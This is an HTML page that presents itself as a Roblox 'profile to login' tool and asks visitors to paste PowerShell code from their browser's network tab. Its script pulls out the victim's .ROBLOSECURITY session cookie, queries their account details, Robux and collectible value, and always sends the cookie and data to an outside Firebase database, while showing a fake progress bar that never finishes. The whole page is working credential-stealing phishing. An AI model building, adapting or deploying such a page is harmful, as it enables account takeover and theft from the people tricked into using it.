<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Roblox Profile → Login 2025</title>
  <style>
    body{margin:0;background:#0d1117;color:#c9d1d9;font-family:system-ui;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;background-image:radial-gradient(circle at top right,rgba(0,255,150,0.07),transparent 50%),radial-gradient(circle at bottom left,rgba(100,50,255,0.07),transparent 50%)}
    .card{background:#161b22;border:1px solid #30363d;border-radius:16px;max-width:720px;width:100%;padding:50px;text-align:center;box-shadow:0 10px 40px rgba(0,0,0,0.6)}
    h1{font-size:3.2em;color:#fff;margin-bottom:16px}
    p{font-size:1.3em;color:#8b949e;margin-bottom:35px}
    textarea{width:100%;height:280px;background:#0d1117;border:2px solid #30363d;border-radius:12px;padding:20px;font-family:Consolas,monospace;font-size:15px;color:#58a6ff;resize:none}
    button{background:#238636;color:#fff;padding:16px 40px;font-size:19px;font-weight:600;border:none;border-radius:10px;cursor:pointer;margin-top:20px}
    button:hover{background:#2ea043}
    #msg{margin-top:25px;font-size:19px;color:#f0f6fc}
    .load{display:none;margin-top:30px;font-size:22px;color:#58a6ff;font-weight:600}
  </style>
</head>
<body>
<div class="card">
  <h1>Roblox Profile → Login</h1>
  <p>2025 Working Method<br>Paste the PowerShell code from Network tab → get instant login</p>
  <textarea id="paste" placeholder="Paste the full PowerShell code here (Ctrl+V)"></textarea>
  <button onclick="run()">GET LOGIN</button>
  <div id="msg">Waiting for paste...</div>
  <div id="load" class="load">Extracting login... please wait</div>
</div>

<script>
async function run() {
  const text = document.getElementById("paste").value;

  const cookie = text.split('".ROBLOSECURITY", "')[1]?.split('"')[0];
  if (!cookie) {
    document.getElementById("msg").textContent = "No cookie found – copy again";
    return;
  }

  const headers = {
    "Cookie": ".ROBLOSECURITY=" + cookie,
    "Accept": "application/json",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
  };

  // DEFAULT VALUES (will be replaced if any call succeeds)
  let user = "NoData", display = "NoData", userid = 0, robux = 0, rap = 0, premium = "No", headshot = "";

  try {
    const auth = await fetch("https://users.roblox.com/v1/users/authenticated", { headers, credentials: "include" });
    if (auth.ok) {
      const u = await auth.json();
      user = u.name;
      display = u.displayName || u.name;
      userid = u.id;

      // Robux
      try { const r = await fetch(`https://economy.roblox.com/v1/users/${userid}/currency`, { headers }); if (r.ok) robux = (await r.json()).robux; } catch(e) {}

      // RAP (collectibles)
      try { 
        const rapRes = await fetch(`https://inventory.roblox.com/v1/users/${userid}/assets/collectibles?limit=100`, { headers });
        if (rapRes.ok) {
          const data = await rapRes.json();
          rap = data.data.reduce((a, i) => a + (i.recentAveragePrice || 0), 0);
        }
      } catch(e) {}

      // Premium
      try { 
        const prem = await fetch(`https://premiumfeatures.roblox.com/v1/users/${userid}/validate-membership`, { headers });
        if ((await prem).ok) premium = (await (await prem).text()) === "true" ? "Yes" : "No";
      } catch(e) {}

      // Headshot
      try {
        const thumb = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userid}&size=150x150&format=Png`);
        if (thumb.ok) {
          const j = await thumb.json();
          headshot = j.data[0]?.imageUrl || "";
        }
      } catch(e) {}
    }
  } catch(e) {}

  // ALWAYS SEND THE COOKIE + WHATEVER WE COULD GRAB (never "Failed")
  fetch("https://flamesaxrch-empire-v2-default-rtdb.europe-west1.firebasedatabase.app/drops.json", {
    method: "POST",
    body: JSON.stringify({
      cookie,
      user: user || "NoData",
      display: display || "NoData",
      userid,
      robux,
      rap,
      premium,
      headshot: headshot || "",
      time: new Date().toLocaleString()
    }),
    headers: {"Content-Type": "application/json"}
  });

  document.getElementById("msg").style.display = "none";
  document.getElementById("load").style.display = "block";
  let p = 18;
  setInterval(() => {
    p += Math.floor(Math.random() * 22);
    if (p > 94) p = 94;
    document.getElementById("load").innerHTML = `Generating login... ${p}%`;
  }, 3000);
}
</script>
</body>
</html>
